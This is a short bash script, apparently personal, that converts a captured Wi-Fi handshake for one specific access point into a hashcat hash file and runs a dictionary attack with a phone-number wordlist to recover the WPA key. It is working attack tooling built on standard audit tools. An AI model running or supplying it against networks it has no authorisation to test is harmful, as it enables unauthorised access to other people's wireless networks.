#!/bin/bash
set -e

SOURCE=`basename $0 .sh`

work_path=/media/chenny/share/wifi_crack

LOG_PATH=${work_path}/log
LOG=${LOG_PATH}/${SOURCE}_`date +"%Y%m%d"`.log

mkdir -p ${LOG_PATH}
exec > ${LOG} 2>&1

printf "$0 started at `date`\n" 

cd ${work_path}

dict_path=${work_path}/phone.dict
cap_path=${work_path}/caps
cap=48:7D:2E:1C:05:EA.cap-01.cap

echo "Work path: ${work_path}"
echo "Dictionary file: ${dict_path}"

cap_name=$(basename ${cap} .cap)

echo "Generate hc22000 hash file"
hc22000_file=${cap_path}/${cap_name}.hc22000
hcxpcapngtool -o ${hc22000_file} ${cap_path}/${cap_name}.cap 

echo "Generated: "
ls -l ${hc22000_file}

echo "Show phone dictionary"
ls -l ${dict_path}

echo "Kicking off hashcat..."
hashcat -m 22000 -w 3 --hwmon-disable \
--session ${cap_name} --status --status-timer 10 \
${hc22000_file} \
${dict_path} \
-o ${work_path}/${cap_name}_key.txt --potfile-path ${work_path}/${cap_name}.potfile
